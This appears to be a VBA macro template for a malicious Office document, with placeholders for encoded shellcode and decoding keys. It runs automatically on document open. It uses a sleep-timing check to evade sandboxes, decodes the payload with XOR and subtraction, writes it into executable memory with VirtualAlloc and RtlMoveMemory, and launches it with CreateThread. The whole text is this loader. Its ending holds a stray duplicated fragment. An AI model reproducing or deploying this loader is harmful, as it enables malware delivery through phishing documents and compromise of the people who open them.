Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep(2000)
    t2 = Now()
    time = DateDiff("s",t1,t2)

    If time < 2 Then
        Exit Function
    End If

    {shellcode}

    For i = 0 To UBound({bufname})
        {bufname}(i) = (({bufname}(i) Xor {xor}) - {rop} ) And 255
    Next i

    addr = VirtualAlloc(0, UBound({bufname}), &H3000, &H40)

    For counter = LBound({bufname}) To UBound({bufname})
        data = {bufname}(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

    MyMacro
End Sub
